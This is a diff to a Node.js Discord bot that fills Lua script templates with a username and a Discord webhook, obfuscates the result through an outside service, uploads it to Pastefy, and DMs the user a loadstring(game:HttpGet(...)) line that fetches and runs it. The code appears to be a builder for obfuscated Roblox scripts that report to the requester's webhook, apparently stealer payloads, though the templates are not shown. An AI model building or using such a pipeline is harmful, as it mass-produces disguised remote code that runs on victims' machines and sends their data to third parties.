@@ -47,7 +47,6 @@ const TEMPLATE_MAP = {
 const sanitize = (s) =>
   String(s || "user").replace(/[^a-zA-Z0-9_-]/g, "_");
 
-// 🔒 Lua 5.1–safe replacement (NO Lua 5.3 operators)
 function buildScript(template, u, webhook) {
   const safe = (v) =>
     String(v || "")
@@ -57,7 +56,7 @@ function buildScript(template, u, webhook) {
 
   return template
     .replace(/%%USERNAME%%/g, safe(u))
-    .replace(/%%WEBHOOK%%/g, safe(webhook))
+    .replace(/%%WEBHOOK%%/g, safe(webhook));
 }
 
 function ensureUserDir(user) {
@@ -66,87 +65,42 @@ function ensureUserDir(user) {
   return dir;
 }
 
-// ---------- GOOFYSCATOR OBFUSCATOR (HTTP API) ----------
+// ---------- PREPROCESSOR + GOOFYSCATOR ----------
 async function runObfuscator(inputPath) {
-  const sourceCode = fs.readFileSync(inputPath, "utf8");
-
-  try {
-    // Try the web API endpoint first
-    const res = await axios.post(
-      OBFUSCATOR_URL,
-      { source: sourceCode },
-      {
-        headers: {
-          "Content-Type": "application/json",
-          "User-Agent": "GoofyscatorBot/1.0",
-        },
-        timeout: 30000,
-        maxRedirects: 5,
-      }
-    );
-
-    // Handle different response formats
-    if (res.data && res.data.obfuscated) {
-      return res.data.obfuscated;
-    }
-    if (res.data && res.data.code) {
-      return res.data.code;
-    }
-    if (res.data && res.data.result) {
-      return res.data.result;
-    }
-    if (typeof res.data === "string") {
-      return res.data;
-    }
-
-    throw new Error("Unexpected response format from obfuscator");
-  } catch (apiErr) {
-    console.warn("⚠️ API call failed, falling back to local obfuscator:", apiErr.message);
-
-    // Fallback: try local obfuscator if OBFUSCATOR_PATH is set
-    if (!process.env.OBFUSCATOR_PATH) {
-      throw new Error("No obfuscator available. Set OBFUSCATOR_PATH for local fallback.");
-    }
-
-    return new Promise((resolve, reject) => {
-      const OBFUSCATOR_PATH = process.env.OBFUSCATOR_PATH;
-      let cmd = OBFUSCATOR_PATH;
-      let args = [inputPath];
-
-      if (
-        OBFUSCATOR_PATH.endsWith(".bat") ||
-        OBFUSCATOR_PATH.endsWith(".cmd")
-      ) {
-        cmd = "cmd.exe";
-        args = ["/c", OBFUSCATOR_PATH, inputPath];
-      } else if (OBFUSCATOR_PATH.endsWith(".js")) {
-        cmd = process.execPath;
-        args = [OBFUSCATOR_PATH, inputPath];
-      }
-
-      const proc = spawn(cmd, args, { windowsHide: true });
-
-      let stdout = "";
-      let stderr = "";
-
-      proc.stdout.on("data", (d) => (stdout += d.toString()));
-      proc.stderr.on("data", (d) => (stderr += d.toString()));
-
-      proc.on("close", (code) => {
-        const guessFile = inputPath.replace(".lua", "_obfuscated.lua");
-
-        if (!stdout.trim() && fs.existsSync(guessFile)) {
-          stdout = fs.readFileSync(guessFile, "utf8");
-        }
-
-        if (code !== 0 || !stdout.trim()) {
-          return reject(new Error(stderr || "Obfuscator failed"));
-        }
-
-        resolve(stdout.trim());
-      });
+  // Step 1: Run preprocess.js to strip comments
+  const preprocessed = await new Promise((resolve, reject) => {
+    const proc = spawn(process.execPath, [path.join(__dirname, "preprocess.js"), inputPath], {
+      windowsHide: true,
     });
-  }
+    let out = "";
+    let err = "";
+    proc.stdout.on("data", (d) => (out += d.toString()));
+    proc.stderr.on("data", (d) => (err += d.toString()));
+    proc.on("close", (code) => {
+      if (code !== 0) return reject(new Error(err || "Preprocessor failed"));
+      resolve(out);
+    });
+  });
+
+  // Step 2: Send to Goofyscator
+  const res = await axios.post(
+    OBFUSCATOR_URL,
+    { source: preprocessed },
+    {
+      headers: {
+        "Content-Type": "application/json",
+        "User-Agent": "GoofyscatorBot/1.0",
+      },
+      timeout: 30000,
+    }
+  );
+
+  if (res.data && res.data.obfuscated) return res.data.obfuscated;
+  if (res.data && res.data.code) return res.data.code;
+  if (res.data && res.data.result) return res.data.result;
+  if (typeof res.data === "string") return res.data;
+
+  throw new Error("Unexpected response from obfuscator");
 }
 
 // ---------- PASTEFY ----------
@@ -165,25 +119,14 @@ async function uploadToPastefy(script) {
       },
     }
   );
-
   return res.data.paste.raw_url;
 }
 
 // ---------- SCRIPT GENERATION ----------
-async function generateScript(
-  u,
-  webhook,
-  user,
-  templatePath
-) {
+async function generateScript(u, webhook, user, templatePath) {
   const dir = ensureUserDir(user);
-
   const template = fs.readFileSync(templatePath, "utf8");
-  const rawScript = buildScript(
-    template,
-    u,
-    webhook,
-  );
+  const rawScript = buildScript(template, u, webhook);
 
   const rawPath = path.join(dir, "script.lua");
   fs.writeFileSync(rawPath, rawScript);
@@ -224,10 +167,9 @@ client.on("interactionCreate", async (i) => {
         new ActionRowBuilder().addComponents(
           new TextInputBuilder()
             .setCustomId("u")
-            .setLabel("Username ")
+            .setLabel("Username")
             .setRequired(true)
             .setStyle(TextInputStyle.Short)
-     
         ),
         new ActionRowBuilder().addComponents(
           new TextInputBuilder()
@@ -235,10 +177,8 @@ client.on("interactionCreate", async (i) => {
             .setLabel("Webhook")
             .setRequired(true)
             .setStyle(TextInputStyle.Short)
-        
         )
       );
-
     return i.showModal(modal);
   }
 
@@ -249,7 +189,6 @@ client.on("interactionCreate", async (i) => {
       const templateKey = i.customId.split(":")[1];
       const templatePath = TEMPLATE_MAP[templateKey];
 
-      
       const rawUrl = await generateScript(
         i.fields.getTextInputValue("u"),
         i.fields.getTextInputValue("wh"),
@@ -257,20 +196,15 @@ client.on("interactionCreate", async (i) => {
         templatePath
       );
 
-      // ✅ SENT TO DMs (unchanged behavior)
       await i.user.send({
-  content: `\`\`\`lua
-loadstring(game:HttpGet("${rawUrl}"))()
-\`\`\``
-}
-      );
+        content: `\`\`\`lua\nloadstring(game:HttpGet("${rawUrl}"))()\n\`\`\``
+      });
 
       await i.editReply("✅ Script generated. Check your DMs.");
     } catch (e) {
       const file = new AttachmentBuilder(Buffer.from(String(e)), {
         name: "error.txt",
       });
-
       await i.editReply({
         content: "❌ Failed to generate script.",
         files: [file],
@@ -282,14 +216,12 @@ loadstring(game:HttpGet("${rawUrl}"))()
 // ---------- START ----------
 (async () => {
   const rest = new REST({ version: "10" }).setToken(TOKEN);
-
   await rest.put(
     GUILD_ID
       ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
       : Routes.applicationCommands(CLIENT_ID),
     { body: commands }
   );
-
   await client.login(TOKEN);
   console.log("✅ Bot started successfully");
 })();
